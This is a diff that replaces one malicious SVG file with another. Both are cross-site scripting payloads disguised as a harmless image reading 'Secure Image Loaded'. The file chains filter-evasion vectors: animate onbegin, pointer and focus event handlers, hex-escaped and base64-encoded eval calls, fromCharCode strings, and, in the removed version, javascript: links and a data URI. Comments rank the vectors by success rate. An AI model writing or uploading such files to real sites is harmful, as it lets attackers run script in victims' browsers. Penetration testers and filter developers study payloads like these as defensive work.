@@ -1,35 +1,21 @@
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <defs>
-    <!-- Primary payload: javascript: protocol via foreignObject (most reliable) -->
-    <foreignObject id="xss" width="100%" height="100%">
-      <div xmlns="http://www.w3.org/1999/xhtml">
-        <a href="javascript:alert('XSS')">Click for XSS</a>
-        <script>alert('XSS')</script>
-      </div>
-    </foreignObject>
-    
-    <!-- Backup 1: Animation-based onload -->
-    <animate id="anim" attributeName="onload" begin="0s" values="alert('XSS');"/>
-    
-    <!-- Backup 2: XLink attack -->
-    <rect width="100" height="100" xlink:href="javascript:alert('XSS')"/>
-    
-    <!-- Backup 3: Event handler obfuscation -->
-    <script><![CDATA[
-      /* CDATA bypasses HTML entity filtering */
-      window.onload = function(){alert('XSS')};
-      /* Multiple whitespace variants */
-      o­nlo­ad=alert('XSS')
-    ]]></script>
-    
-    <!-- Backup 4: Data URI with multiple encodings -->
-    <image xlink:href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">
-  </defs>
-  
-  <!-- Trigger via use reference (often missed by filters) -->
-  <use href="#xss" x="0" y="0" width="1" height="1" onload="alert('XSS')"/>
-  
-  <!-- Visual camouflage - makes it look like legit image -->
-  <rect width="400" height="300" fill="#f0f0f0"/>
-  <text x="10" y="20" font-size="12" fill="#666">Loading secure image...</text>
+<svg viewBox="0 0 1 1" width="1" height="1">
+<!-- 1. Animation onbegin (highest success rate) -->
+<animate id="a1" onbegin="alert('XSS')" attributeName="d" dur="1s" values="M0 0;M1 1"/>
+
+<!-- 2. Attribute handlers chain -->
+<rect onfocusout=alert('XSS') width="1" height="1"/>
+<circle onpointerenter=alert('XSS') cx="1" cy="1" r="1"/>
+
+<!-- 3. Obfuscated string exec -->
+<script>eval('\x61\x6c\x65\x72\x74\x28\x27\x58\x53\x53\x27\x29')</script>
+
+<!-- 4. Case/whitespace variants -->
+<path ONBEGIN=alert(String.fromCharCode(88,83,83)) d="M0 0"/>
+
+<!-- 5. Parser confusion + legit appearance -->
+<animateTransform onbegin="eval(atob('YWxlcnQoJ1hTUycp'))" attributeName="transform" type="scale" dur="1s"/>
+
+<!-- Legit image camouflage -->
+<rect fill="#f8f9fa" width="400" height="300" opacity="1"/>
+<text x="10" y="25" font-size="14" fill="#6c757d">Secure Image Loaded</text>
 </svg>
